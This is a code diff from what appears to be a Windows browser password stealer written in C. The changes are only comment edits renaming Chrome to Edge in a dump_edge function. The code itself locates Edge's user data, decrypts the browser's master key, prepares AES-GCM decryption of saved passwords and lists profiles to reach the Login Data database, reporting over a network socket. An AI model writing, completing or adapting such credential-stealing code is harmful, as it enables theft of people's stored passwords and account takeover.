@@ -186,14 +186,14 @@ BOOL dump_chrome(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 }
 
 BOOL dump_edge(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
-	/* Gets the Chrome Folder if exists, which is% LOCALAPPDATA% \Google\Chrome\User Data */
-	WCHAR edge_dir[MAX_PATH] = { L'\0' };													// Buffer to hold Google Chrome directory
+	/* Gets the Edge Folder if exists */
+	WCHAR edge_dir[MAX_PATH] = { L'\0' };													// Buffer to hold Edge directory
 	if (!get_user_dir(FOLDERID_LocalAppData, L"\\Microsoft\\Edge\\User Data\\", edge_dir, message, message_size)) {
 		Debug(send_data(message, ConnectSocket);)
 			return FALSE;
 	}
 
-	/* Get, decrypt the MasterKey of chrome and then use it to obtain the AES-GCM decryption handler which is used to decrypt passwords */
+	/* Get, decrypt the MasterKey of Edge and then use it to obtain the AES-GCM decryption handler which is used to decrypt passwords */
 	WCHAR enc_master_key[ENC_MASTER_KEY_LEN] = { L'\0' };
 	if (!get_encrypted_masterkey(edge_dir, L"Local State", enc_master_key, ENC_MASTER_KEY_LEN, message, message_size)) {
 		Debug(send_data(message, ConnectSocket);)
@@ -212,10 +212,10 @@ BOOL dump_edge(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 	}
 	/* -------------------------------------------------------------------------------------------------- */
 
-	/* Converts the WCHAR chrome directory path to CHAR */
+	/* Converts the WCHAR Edge directory path to CHAR */
 	size_t size_returned_char_master_key;
 	errno_t err;
-	CHAR chrome_dir_char[MAX_PATH] = { '\0' };												// Chrome directory in CHAR, used to get profile paths to get Login Data db
+	CHAR chrome_dir_char[MAX_PATH] = { '\0' };												// Edge directory in CHAR, used to get profile paths to get Login Data db
 	if ((err = wcstombs_s(&size_returned_char_master_key, chrome_dir_char, MAX_PATH * sizeof(CHAR), edge_dir, (MAX_PATH - 1) * sizeof(CHAR)))) {
 		Debug(sprintf_s(message, message_size * sizeof(CHAR), "wcstombs_s: Error when converting wchar master key to char master key, error: %d\n", err);)
 			Debug(send_data(message, ConnectSocket);)
@@ -233,7 +233,7 @@ BOOL dump_edge(SOCKET ConnectSocket, CHAR* message, DWORD message_size) {
 	memset(decrypted_credential, 0, decrypted_credential_size);
 
 
-	/* Gets a file handle for Chrome directory to list the files in that directory */
+	/* Gets a file handle for Edge directory to list the files in that directory */
 	WIN32_FIND_DATAA dir_files;																// Handle to get file/folders on Chrome_dir
 	HANDLE dir_handle;																		// Handle to a directory/file
 	if (!get_file_explorer(chrome_dir_char, &dir_files, &dir_handle, message, message_size)) {
